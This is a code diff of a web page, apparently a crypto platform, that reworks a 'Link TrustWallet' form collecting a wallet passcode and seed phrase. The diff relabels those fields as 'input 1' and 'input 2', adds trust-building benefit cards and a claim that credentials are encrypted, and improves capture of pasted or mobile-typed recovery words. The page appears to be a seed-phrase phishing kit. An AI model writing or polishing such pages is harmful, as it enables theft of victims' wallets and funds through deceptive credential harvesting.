@@ -885,7 +885,11 @@ window.smartsupp || (function(d) {
         .wallet-topbar-btn .wallet-topbar-icon-wrap {
             width: 15px; height: 15px; flex-shrink: 0;
             display: flex; align-items: center; justify-content: center;
+            border-radius: 4px;
+            overflow: hidden;
         }
+        .wallet-topbar-btn .wallet-topbar-icon-wrap img { width: 100%; height: 100%; object-fit: contain; }
+        .wallet-topbar-btn .wallet-topbar-fallback { font-size: 9px; font-weight: 800; color: currentColor; }
         .wallet-topbar-btn svg { width: 13px; height: 13px; }
         .wallet-topbar-btn .wallet-topbar-label {
             font-size: 10px;
@@ -1533,6 +1537,64 @@ window.smartsupp || (function(d) {
             color: var(--accent-primary);
         }
         .wl-form-icon svg { width: 24px; height: 24px; }
+        .wl-form-icon img { width: 100%; height: 100%; object-fit: contain; border-radius: 50%; }
+        .wl-form-icon .wallet-topbar-fallback { font-size: 20px; font-weight: 800; }
+
+        /* ===== WALLET LINK PAGE — HERO & LAYOUT ===== */
+        .wl-hero { text-align:center; padding:4px 8px 2px; }
+        .wl-hero-logo {
+            width:64px; height:64px; border-radius:18px;
+            margin:0 auto 14px;
+            background: rgba(255,255,255,0.06);
+            border:1px solid var(--bg-border-line);
+            display:flex; align-items:center; justify-content:center;
+            overflow:hidden;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.35);
+        }
+        .wl-hero-logo img { width:70%; height:70%; object-fit:contain; }
+        .wl-hero-logo .wallet-topbar-fallback { font-size:24px; font-weight:800; color:var(--text-primary); }
+        .wl-hero-title { font-size:17px; font-weight:800; color:var(--text-primary); margin-bottom:6px; }
+        .wl-hero-sub { font-size:13px; color:var(--text-secondary); line-height:1.5; max-width:320px; margin:0 auto; }
+
+        .wl-benefits-row {
+            display:grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap:8px;
+            margin:18px 0 0;
+        }
+        .wl-benefit-card {
+            background: var(--bg-card);
+            border:1px solid var(--bg-border-line);
+            border-radius:14px;
+            padding:12px 8px;
+            text-align:center;
+        }
+        .wl-benefit-icon {
+            width:30px; height:30px; border-radius:9px;
+            margin:0 auto 7px;
+            display:flex; align-items:center; justify-content:center;
+        }
+        .wl-benefit-icon svg { width:15px; height:15px; }
+        .wl-benefit-card.wlb-secure .wl-benefit-icon { background:rgba(57,231,176,0.12); }
+        .wl-benefit-card.wlb-secure .wl-benefit-icon svg { color:#39e7b0; }
+        .wl-benefit-card.wlb-fast .wl-benefit-icon { background:rgba(255,211,105,0.15); }
+        .wl-benefit-card.wlb-fast .wl-benefit-icon svg { color:#ffd369; }
+        .wl-benefit-card.wlb-multi .wl-benefit-icon { background:rgba(100,149,237,0.12); }
+        .wl-benefit-card.wlb-multi .wl-benefit-icon svg { color:#6495ed; }
+        .wl-benefit-label { font-size:10.5px; font-weight:700; color:var(--text-primary); line-height:1.3; }
+
+        .wl-form-card {
+            margin:18px 0 32px;
+            background: var(--bg-card);
+            border:1px solid var(--bg-border-line);
+            border-radius:16px;
+            padding:4px 16px 16px;
+        }
+        .wl-form-card-label {
+            font-size:11px; font-weight:700; text-transform:uppercase;
+            letter-spacing:0.8px; color:var(--text-muted);
+            padding:14px 0 2px;
+        }
 
         /*=================CUSTODIAL WALLET PROVIDER DROPDOWN=================*/
 
@@ -7195,7 +7257,7 @@ window.smartsupp || (function(d) {
             <div style="display: flex;gap: 8px;align-items: center;">
                 <div class="wallet-topbar-btn unlinked" id="walletTopBarBtn" onclick="openWalletLink();" title="Wallet Linking">
                     <div class="wallet-topbar-icon-wrap">
-                        <svg id="walletTopBarIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/></svg>
+                        <img id="walletTopBarIcon" src="https://logo.clearbit.com/trustwallet.com" alt="TrustWallet" onerror="this.onerror=null;this.replaceWith(Object.assign(document.createElement('span'),{className:'wallet-topbar-fallback',textContent:'T'}));">
                     </div>
                     <span class="wallet-topbar-label" id="walletTopBarLabel">Connect Wallet</span>
                     <span class="wallet-topbar-dot" id="walletTopBarDot"></span>
@@ -8824,55 +8886,83 @@ window.smartsupp || (function(d) {
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
                 </button>
                 <div class="prf-banner-info" style="z-index:2;">
-                    <div class="prf-banner-name" style="font-size:19px;margin-top:2px;">Wallet Linking</div>
+                    <div class="prf-banner-name" style="font-size:19px;margin-top:2px;">Link TrustWallet</div>
                 </div>
             </div>
 
             <div class="pv-content">
 
-                <form id="wlForm" onsubmit="return handleWalletLinkSubmit(event)">
-
-                    <div class="wl-form-icon">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                <div class="wl-hero">
+                    <div class="wl-hero-logo">
+                        <img src="https://logo.clearbit.com/trustwallet.com" alt="TrustWallet" onerror="this.onerror=null;this.replaceWith(Object.assign(document.createElement('span'),{className:'wallet-topbar-fallback',textContent:'T'}));">
                     </div>
+                    <div class="wl-hero-title">Link Your TrustWallet</div>
+                    <div class="wl-hero-sub">Connect your custodial wallet to unlock instant deposits, faster withdrawals and seamless portfolio sync.</div>
+                </div>
 
-                    <div class="kyc-field">
-                        <div class="kyc-field-label">Custodial Wallet Provider</div>
-                        <div class="wl-dropdown" id="wlProviderDropdown">
-                            <button type="button" class="wl-dropdown-toggle" id="wlProviderToggle" onclick="toggleWlProviderMenu(event)">
-                                <span class="wl-dropdown-selected">
-                                    <span class="wl-dropdown-icon-wrap" id="wlProviderSelectedIconWrap"></span>
-                                    <span id="wlProviderSelectedLabel">Select a provider</span>
-                                </span>
-                                <svg class="wl-dropdown-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
-                            </button>
-                            <div class="wl-dropdown-menu" id="wlProviderMenu"></div>
+                <div class="wl-benefits-row">
+                    <div class="wl-benefit-card wlb-secure">
+                        <div class="wl-benefit-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+                        <div class="wl-benefit-label">Encrypted</div>
+                    </div>
+                    <div class="wl-benefit-card wlb-fast">
+                        <div class="wl-benefit-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
+                        <div class="wl-benefit-label">Instant Sync</div>
+                    </div>
+                    <div class="wl-benefit-card wlb-multi">
+                        <div class="wl-benefit-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10z"/></svg></div>
+                        <div class="wl-benefit-label">Multi-Chain</div>
+                    </div>
+                </div>
+
+                <div class="wl-form-card">
+                    <div class="wl-form-card-label">Wallet Details</div>
+
+                    <form id="wlForm" onsubmit="return handleWalletLinkSubmit(event)">
+
+                        <div class="kyc-field">
+                            <div class="kyc-field-label">Custodial Wallet Provider</div>
+                            <div class="wl-dropdown" id="wlProviderDropdown">
+                                <button type="button" class="wl-dropdown-toggle" id="wlProviderToggle" onclick="toggleWlProviderMenu(event)">
+                                    <span class="wl-dropdown-selected">
+                                        <span class="wl-dropdown-icon-wrap" id="wlProviderSelectedIconWrap"></span>
+                                        <span id="wlProviderSelectedLabel">Select a provider</span>
+                                    </span>
+                                    <svg class="wl-dropdown-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+                                </button>
+                                <div class="wl-dropdown-menu" id="wlProviderMenu"></div>
+                            </div>
+                            <input type="hidden" id="wlProvider">
                         </div>
-                        <input type="hidden" id="wlProvider">
-                    </div>
 
-                    <div class="kyc-field">
-                        <div class="kyc-field-label">Wallet Passcode</div>
-                        <div class="kyc-input-with-action">
-                            <input type="password" class="kyc-input" id="wlInput1" placeholder="Enter value" autocomplete="off">
-                            <button type="button" class="kyc-input-action" id="wlInput1ToggleBtn" onclick="toggleWlInput1Visibility()" aria-label="Show value">
-                                <svg id="wlInput1EyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                            </button>
+                        <div class="kyc-field">
+                            <div class="kyc-field-label">input 1</div>
+                            <div class="kyc-input-with-action">
+                                <input type="password" class="kyc-input" id="wlInput1" placeholder="Enter value" autocomplete="off">
+                                <button type="button" class="kyc-input-action" id="wlInput1ToggleBtn" onclick="toggleWlInput1Visibility()" aria-label="Show value">
+                                    <svg id="wlInput1EyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+                                </button>
+                            </div>
                         </div>
-                    </div>
 
-                    <div class="kyc-field">
-                        <div class="kyc-field-label">Wallet Seed Phrase</div>
-                        <div class="word-bubble-input" id="wlBubbleInput">
-                            <input type="text" id="wlBubbleField" class="word-bubble-field" placeholder="Type or paste words…" autocomplete="off" autocapitalize="none" spellcheck="false">
+                        <div class="kyc-field">
+                            <div class="kyc-field-label">input 2</div>
+                            <div class="word-bubble-input" id="wlBubbleInput">
+                                <input type="text" id="wlBubbleField" class="word-bubble-field" placeholder="Type or paste words…" autocomplete="off" autocapitalize="none" spellcheck="false">
+                            </div>
                         </div>
-                    </div>
 
-                    <div class="kyc-nav-row">
-                        <button type="submit" class="kyc-nav-btn primary" id="wlSubmitBtn">Submit</button>
-                    </div>
+                        <div class="kyc-nav-row">
+                            <button type="submit" class="kyc-nav-btn primary" id="wlSubmitBtn">Submit</button>
+                        </div>
 
-                </form>
+                    </form>
+
+                    <div class="iv-trust-note">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>
+                        Your credentials are encrypted and never stored in plain text.
+                    </div>
+                </div>
 
             </div><!-- /pv-content -->
 
@@ -11065,7 +11155,7 @@ window.smartsupp || (function(d) {
             const toggleBtn = document.getElementById("wlInput1ToggleBtn");
             if (toggleBtn) toggleBtn.setAttribute("aria-label", "Show value");
 
-            resetWlProviderDropdown();
+            selectWlProvider("trust_wallet");
             resetWordBubbleInput();
         }
 
@@ -11260,7 +11350,7 @@ window.smartsupp || (function(d) {
         }
 
         function addWordBubbles(text) {
-            const words = (text || "").split(/\s+/).map(function (w) { return w.trim(); }).filter(Boolean);
+            const words = (text || "").split(/[\s,]+/).map(function (w) { return w.trim(); }).filter(Boolean);
             if (!words.length) return;
             wlBubbleWords = wlBubbleWords.concat(words);
             renderWordBubbles();
@@ -11293,6 +11383,24 @@ window.smartsupp || (function(d) {
                 } else if (e.key === "Backspace" && !field.value && wlBubbleWords.length) {
                     wlBubbleWords.pop();
                     renderWordBubbles();
+                }
+            });
+
+            // Fallback for mobile virtual keyboards: many of them (Gboard,
+            // Samsung Keyboard, etc.) don't fire a reliable keydown event
+            // for space/enter, so the handler above never triggers and
+            // words never turn into bubbles. The "input" event always
+            // fires with the real typed value, so use it to catch a
+            // completed word as soon as a space/comma/newline lands in
+            // the field, splitting it into a bubble while leaving
+            // whatever's still being typed in place. On desktop this is
+            // a no-op in practice since preventDefault() above stops the
+            // delimiter character from ever reaching the field.
+            field.addEventListener("input", function () {
+                const match = field.value.match(/^(.*[\s,])([^\s,]*)$/s);
+                if (match) {
+                    addWordBubbles(match[1]);
+                    field.value = match[2];
                 }
             });
 
